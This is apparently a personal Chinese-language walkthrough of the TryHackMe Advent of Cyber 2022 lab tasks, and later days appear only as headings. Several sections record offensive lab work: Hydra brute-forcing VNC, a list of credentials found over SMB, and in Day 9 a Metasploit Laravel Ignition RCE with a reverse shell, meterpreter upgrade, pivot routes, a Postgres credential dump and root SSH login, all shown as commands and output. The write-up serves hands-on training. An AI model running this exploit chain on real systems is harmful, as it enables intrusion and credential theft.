> https://tryhackme.com/room/adventofcyber4
> #Event

# Writeup
- [saskrednecktek / Cyber-Security-Learning](https://github.com/saskrednecktek/Cyber-Security-Learning/tree/104764f0771a05a5569560baa444eb411da03148/TryHackMe_com/Rooms/Advent%20of%20Cyber%202022)
- https://mansoorbarri.com/writeups/
# Task 1 Introduction

介绍

# Task 2 Short Tutorial & Rules

连接到Tryhackme的个人靶机网络

# Task 3 Our Socials

介绍了Tryhackme的社交媒体帐号

# Task 4 Subscribing, TryHackMe for Business & Christmas Swag!

介绍了Tryhackme的商店、订阅和商业版计划

# Task 5 Nightmare Before Elfmas - The Story

一个背景故事（挺有趣的🤣）

# Task 6 [Day 1] Frameworks Someone's coming to town!

介绍了安全框架和杀伤链两大概念
![[Pasted image 20221217212458.png]]

一个简单的拼图游戏，拼完事了
![[Pasted image 20221218093248.png]]

# Task 7 [Day 2] Log Analysis Santa's Naughty & Nice Log

相对简单，直接抱着grep就可以了
```shell
grep -v "404 437" webserver.log | grep "list"
grep "THM{" *
```
![[Pasted image 20221218094539.png]]

# Task 8 [Day 3] OSINT Nothing escapes detective McRed

介绍了何为Osint（开源网络情报）

[https://who.is/whois/santagift.shop](https://who.is/whois/santagift.shop)![[Pasted image 20221218103633.png]]

[https://github.com/muhammadthm/SantaGiftShop](https://github.com/muhammadthm/SantaGiftShop)，直接库内搜索`THM{`就好了
![[Pasted image 20221218103951.png]]

密码也是，直接搜索`DB_PASSWORD`
![[Pasted image 20221218104106.png]]

QA服务器就在`README.md`里面

相对简单，直接搜就完事了，甚至不需要翻提交历史
![[Pasted image 20221218104645.png]]

# Task 9 [Day 4] Scanning Scanning through the snow
#Offensive 

介绍了扫描的概念，以及如何扫描

## Nmap
### TCP SYN 扫描 绕过TCP三次握手
```shell
nmap -sS 10.10.254.22

Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-17 21:54 EST
Nmap scan report for 10.10.254.22 (10.10.254.22)
Host is up (0.27s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 2.82 seconds
```
### Ping 扫描
```shell
nmap -sn 10.10.254.22

Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-17 21:54 EST
Nmap scan report for 10.10.254.22 (10.10.254.22)
Host is up (0.26s latency).
Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds
```
### 操作系统扫描 
```shell
nmap -O 10.10.254.22

Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-17 21:55 EST
Nmap scan report for 10.10.254.22 (10.10.254.22)
Host is up (0.26s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=12/17%OT=22%CT=1%CU=39157%PV=Y%DS=2%DC=I%G=Y%TM=639E81
OS:32%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST
OS:11NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.55 seconds
```
### 检测服务 
```shell
nmap -sV 10.10.254.22

Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-17 21:55 EST
Nmap scan report for 10.10.254.22 (10.10.254.22)
Host is up (0.27s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: IP-10-10-254-22; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.04 seconds
```

## nikto 
```shell
nikto -host 10.10.254.22

- Nikto v2.1.6
---------------------------------------------------------------------------
+ No web server found on 10.10.254.22:80
---------------------------------------------------------------------------
+ 0 host(s) tested
```

通过SMB服务进入服务器之后，得到
```plaintext
USERNAME	PASSWORD
santa		santa101
santahr		santa25
santaciso	santa30
santatech	santa200
santaaccounts	santa400
```

相对也是比较简单的
![[Pasted image 20221218110522.png]]

# Task 10 [Day 5] Brute-Forcing He knows when you're awake
#Offensive 

介绍了远程控制，并指导了如何使用VNC

## Hydra
```shell
hydra -P ./worelists/rockyou.txt 10.10.210.134 vnc
# 很神奇，Attackbox给了一个134M的字典
...
[5900][vnc] host: 10.10.210.134 password: 1q2w3e4r
[STATUS] attack finished for 10.10.210.134 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-17 22:29:37
```
需要注意的是，Kali没有自带Remmina，需要手动安装
```shell
sudo apt install remmina
```

![[Pasted image 20221218113406.png]]
相对来说，难度也算简单了
![[Pasted image 20221218113436.png]]

# Task 11 [Day 6] Email Analysis It's beginning to look a lot like phishing
#Defensive  #Electronic-Forensics 

介绍了电子邮件分析，介绍了电子邮件的数据结构
[在线邮件信誉检查](https://emailrep.io/)
[VirusTotal ](https://www.virustotal.com/gui/home/upload)
[InQuest ](https://labs.inquest.net/)
```shell
ubuntu@ip-10-10-121-190:~/Desktop$ emlAnalyzer -i Urgent\:.eml 
 =================
 ||  Structure  ||
 =================
|- multipart/mixed                       
|  |- multipart/related                  
|  |  |- text/html                       
|  |- application/msword                   [Division_of_labour-Load_share_plan.doc]

 =========================
 ||  URLs in HTML part  ||
 =========================
[+] No URLs found in the html

 ===============================================
 ||  Reloaded Content (aka. Tracking Pixels)  ||
 ===============================================
[+] No content found which will be reloaded from external resources

 ===================
 ||  Attachments  ||
 ===================
[1] Division_of_labour-Load_share_plan.doc        application/msword        attachment

```
其实也算简单，只要跟着教程一步一步来就好，对于附件的话，可以直接将Base64的值拷贝出来，然后解码还原
![[Pasted image 20221218132949.png]]

# Task 12 [Day 7] CyberChef Maldocs roasting on an open fire
#Encode

`CyberChef`我最喜欢的环节！
最后提交链接的时候记得`Defang URL`
![[Pasted image 20221218135203.png]]

# Task 13 [Day 8] Smart Contracts Last Christmas I gave you my ETH
#Smart-Contract

介绍了智能合约，以及`The Re-entrancy Attack`
[https://remix.ethereum.org](https://remix.ethereum.org)
应该是我环境的问题，在线的IDE没办法正确运行。。直接Reverse出flag得了
```python
f4 = "11_ur_"
f8 = str(int(int(int(int(100 / 25) + 20 / 2) - 7) - 2))
f1 = "fl"
f6 = str(int(int(int(int(int(100 / 25) + 20 / 2) - 7) - 2) + 2))
f10 = str(int(int(100 / 10) / 10))
f11 = "n3}"
f5 = str(int(int(int(20 / 2) / 2) - 2))
f7 = "h_1"
f9 = "_m"
f2 = "a"
f3 = "g{4"
print(f1+f2+f3+f4+f5+f6+f7+f8+f9+f10+f11)
flag{411_ur_37h_15_m1n3}
```
感觉这一章节讲的偏少了，主要还是以介绍智能合约为主

# Task 14 [Day 9] Pivoting Dock the halls
#Offensive 

这一章节就涉及到攻击实战了
```shell
# 使用Nmap对靶机进行扫描
nmap -T4 -A -Pn 10.10.214.114

Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-18 03:17 EST
Nmap scan report for 10.10.214.114 (10.10.214.114)
Host is up (0.24s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Curabitur aliquet, libero id suscipit semper
|_http-server-header: Apache/2.4.54 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.16 seconds
```
扫描完成后，开始初步攻击
```shell
# msf开始攻击
use multi/php/ignition_laravel_debug_rce
set rhosts 10.10.214.114
set HttpClientTimeout 20
# 怀疑是网络问题，建议使用远程的Kali攻击机来操作
run
[*] Started reverse TCP handler on 10.10.79.212:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking component version to 10.10.214.114:80
[+] The target appears to be vulnerable.
[*] Command shell session 1 opened (10.10.79.212:4444 -> 10.10.214.114:60934) at 2022-12-18 08:35:52 +0000

whoami
www-data
```
然后对会话进行upgrade
```shell
sessions -u -1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [-1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.79.212:4433 
[*] Sending stage (1017704 bytes) to 10.10.214.114
[*] Meterpreter session 2 opened (10.10.79.212:4433 -> 10.10.214.114:53064) at 2022-12-18 08:37:08 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
```
而后进入会话，对`/var/www/.env`进行信息搜集
```shell
msf6 > sessions -i 2
[*] Starting interaction with 2...

meterpreter > cat /var/www/.env 
...
```
继续，横向穿透
```shell
meterpreter > resolve webservice_database

Host resolutions
================

    Hostname             IP Address
    --------             ----------
    webservice_database  172.28.101.51
background

# 设置路由
msf6 > route add 172.28.101.51/32 -1
[*] Route added

# 设置docker网络的路由
route add 172.17.0.1/32 -1

# 查看当前的路由设置
msf6 > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.17.0.1         255.255.255.255    Session 2
   172.28.101.51      255.255.255.255    Session 2

[*] There are currently no IPv6 routes defined.
```

接下来对数据库进行读取
```shell
# 获取数据库元信息
use auxiliary/scanner/postgres/postgres_schemadump
run postgres://postgres:postgres@172.28.101.51/postgres

# 获取数据库数据内容
use auxiliary/admin/postgres/postgres_sql
run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'

[*] Running module against 172.28.101.51

Query Text: 'select * from users'
=================================

    id  username  password  created_at                  deleted_at
    --  --------  --------  ----------                  ----------
    1   santa     p4$$w0rd  2022-09-13 19:39:51.669279  NIL

[*] Auxiliary module execution completed
```
接下来，启动一个socks5代理
```shell
use auxiliary/server/socks_proxy
run srvhost=127.0.0.1 srvport=9050 version=4a
# 这一步主要是进入内网进行扫描，章节内容对此没有要求
```
继续，进行ssh登录攻击
```shell
use auxiliary/scanner/ssh/ssh_login
run ssh://santa:p4$$w0rd@172.17.0.1
# 整个过程如下
msf6 auxiliary(scanner/ssh/ssh_login) > run ssh://santa:p4$$w0rd@172.17.0.1

[*] 172.17.0.1:22 - Starting bruteforce
[+] 172.17.0.1:22 - Success: 'santa:p4$$w0rd' 'uid=0(root) gid=0(root) groups=0(root) Linux hostname 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 3 opened (10.10.79.212-10.10.214.114:48544 -> 172.17.0.1:22) at 2022-12-18 08:52:32 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_login) > sessions 

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  2         meterpreter x86/linux  www-data @ 172.28.101.50  10.10.79.212:4433 -> 10.10.214.114:53064 (10.10.214.114)
  3         shell linux            SSH root @                10.10.79.212-10.10.214.114:48544 -> 172.17.0.1:22 (172.17.0.1)

msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 3
[*] Starting interaction with 3...

mesg: ttyname failed: Inappropriate ioctl for device
ls /root
root.txt
cat /root/root.txt
THM{47C61A0FA8738BA77308A8A600F88E4B}
```
![[Pasted image 20221218165545.png]]

# Task 15 [Day 10] Hack a game You're a mean one, Mr. Yeti
#Web-Hacking 

介绍了如何使用`Cetus`对在线的`Web Assembly`程序进行分析
直接像CE Engine一样，爆改内存数据就好了
![[Pasted image 20221218172358.png]]

# Task 16 [Day 11] Memory Forensics Not all gifts are nice
#Defensive  #Electronic-Forensics

好诶，专场来了，内存分析！
对取证手来说，属于是有脚就行了，但是远程的shell实在是慢。。
![[Pasted image 20221218194937.png]]

# Task 17 [Day 12] Malware Analysis Forensic McBlue to the REVscue!
#Defensive #Electronic-Forensics 

介绍了恶意软件分析，这方面我还是觉得自动沙盒好用🥰
使用了`Die`、`capa`、`ProcMon`来对程序进行检查，远程靶机真的是，慢到离谱了。。
![[Pasted image 20221218201134.png]]

# Task 18 [Day 13] Packet Analysis Simply having a wonderful pcap time



Task 19 [Day 14] Web Applications I'm dreaming of secure web apps

Task 20 [Day 15] Secure Coding Santa is looking for a Sidekick

Task 21 [Day 16] Secure Coding SQLi’s the king, the carolers sing

Task 22 [Day 17] Secure Coding Filtering for Order Amidst Chaos